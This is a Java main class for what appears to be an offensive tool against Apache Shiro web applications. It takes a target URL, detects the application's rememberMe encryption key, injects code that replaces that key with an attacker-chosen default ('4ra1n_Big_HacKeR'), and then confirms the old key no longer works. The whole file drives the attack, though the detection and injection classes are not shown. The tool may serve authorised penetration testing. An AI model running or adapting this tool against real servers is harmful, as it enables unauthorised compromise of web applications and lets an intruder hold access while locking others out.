package org.sec;

import com.beust.jcommander.JCommander;
import okhttp3.OkHttpClient;
import org.sec.config.Command;
import org.sec.config.Logo;
import org.sec.core.Detect;
import org.sec.core.Inject;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;



public class Main {
    private static final String DEFAULT_NEW_KEY = "4ra1n_Big_HacKeR";
    private static final Logger logger = LoggerFactory.getLogger(Main.class);

    public static void main(String[] args) {
        try {
            Logo.PrintLogo();
            Command command = new Command();
            logger.info("start shiro hacker");
            JCommander jc = JCommander.newBuilder().addObject(command).build();
            jc.parse(args);
            if (command.help) {
                jc.usage();
                return;
            }
            if (command.url == null || command.url.equals("")) {
                return;
            }
            String url = command.url;
            if (!url.startsWith("http")) {
                url = "http" + "://" + url;
            }
            String newKey;
            if (command.targetKey == null || command.targetKey.length() != 16) {
                logger.warn("error key length");
                logger.info("use default: " + DEFAULT_NEW_KEY);
                newKey = DEFAULT_NEW_KEY;
            } else {
                logger.info("use key: " + command.targetKey);
                newKey = command.targetKey;
            }

            OkHttpClient client = new OkHttpClient();
            String key = Detect.start(client, url);
            if(key==null||key.equals("")){
                logger.error("not find key");
                return;
            }
            Inject.start(client, url, key, newKey);
            logger.info("checking");
            logger.info("waiting...");
            String result = Detect.start(client, url);
            if(result==null){
                logger.info("success");
            }
        } catch (Exception e) {
            e.printStackTrace();
            logger.error(e.getMessage());
        }
    }
}
